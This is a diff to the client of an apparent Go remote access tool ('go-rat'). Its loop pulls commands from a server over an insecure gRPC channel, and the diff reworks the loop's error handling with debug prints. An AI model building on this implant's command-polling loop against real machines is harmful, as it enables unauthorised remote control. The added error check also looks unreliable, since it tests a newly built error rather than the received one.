@@ -2,6 +2,8 @@ package main
 
 import (
 	"context"
+	"errors"
+	"fmt"
 	"os"
 	"os/exec"
 	"strings"
@@ -11,6 +13,7 @@ import (
 	"github.com/iortego42/go-rat/grpcapi"
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials/insecure"
+	"google.golang.org/grpc/status"
 )
 
 func main() {
@@ -44,10 +47,20 @@ func main() {
 	for {
 		cmd, err := client.FetchCommand(ctx, identity)
 		// log a eliminar
-		if err != nil && err.Error() == "channel closed" {
+
+		a, ok := status.FromError(errors.New("channel closed"))
+		if ok {
+			log.Info(a)
 			return
 		}
+		if err != nil && err.Error() == a.Err().Error() {
+			log.Info("hey")
+			return
+		}
+		// TODO: Comparar el tipo de error, si al recibir
 		if err != nil {
+			fmt.Println(err)
+			fmt.Println(err.Error())
 			log.Fatal("[!] Error al obtener un commando.", "ERROR", err)
 		}
 		if cmd.In == "" {
